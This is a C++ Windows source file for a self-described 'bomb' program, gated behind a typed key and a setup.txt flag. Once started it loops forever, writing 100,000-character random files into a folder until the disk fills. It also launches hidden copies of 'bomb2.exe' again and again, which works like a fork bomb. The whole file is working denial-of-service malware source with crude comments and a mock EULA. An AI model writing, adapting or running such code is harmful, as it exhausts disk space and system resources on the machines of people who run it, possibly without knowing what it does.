#include <iostream>
#include <fstream>
#include <ctime>
#include <windows.h>
using namespace std;
void WriteToFile(string FILE_NAME, string DATA)
{
   // char b[100];
    //ToChars(b,FILE_NAME);
    ofstream ou(FILE_NAME.c_str());
    ou << DATA;
    ou.close();
}
void CreateFolder(string FOLDER_NAME){
CreateDirectory(FOLDER_NAME.c_str(), NULL);
}
string randStr(int len){
string ans="";
for(int i=0;i<len;i++){
    ans+=(char)(rand()% 20 + 65);
}
return ans;
}
void DoTheFuck(){
    string name="bomb.exe";
    for(int i=0;i<1;i++){

    }


    CreateFolder("shit");
    cout << time(0) << endl;
    while(1){
    WriteToFile("shit\\"+ randStr(20) + ".txt", randStr(100000));
    }
}

int main()
{
    srand(time(0));
    ifstream bgf("confirm.txt");
    string h123="";
    bgf >> h123;
    bgf.close();
    if(h123 == "FDS"){
    while(h123 == "FDS"){
          ifstream bgf12("confirm.txt");
    string h123="";
    bgf12 >> h123;
    bgf12.close();
    if(h123 != "FDS"){return 0;}
       // cout << h123 << endl;
       ShellExecute(NULL, "open", "bomb2.exe", NULL, NULL, SW_HIDE);
       ShellExecute(NULL, "open", "bomb2.exe", NULL, NULL, SW_HIDE);
       ShellExecute(NULL, "open", "bomb2.exe", NULL, NULL, SW_HIDE);
       ShellExecute(NULL, "open", "bomb2.exe", NULL, NULL, SW_HIDE);
       ShellExecute(NULL, "open", "bomb2.exe", NULL, NULL, SW_HIDE);
       DoTheFuck();
    }
     return 0;
    }
    int a12=0;
    ifstream a("setup.txt");
    a >> a12;
    if(a){
        if(a12){
        string ans=randStr(4);
        string h;
        cout << "type to start the bomb: " << ans << endl << ":";
        cin >> h;
        if(h == ans){
        ofstream abds("confirm.txt");
        abds << "FDS";
        cout << "THE HELL IS BEGUN!";
        DoTheFuck();
        }else{
        cout << "wrong access key";
        }
    }else{
    cout << "ACCEPT THE EULA, or leave the program";
    }
    }else{
    cout << "setup.txt not found";
    }
    cout << endl;
    system("pause");
}
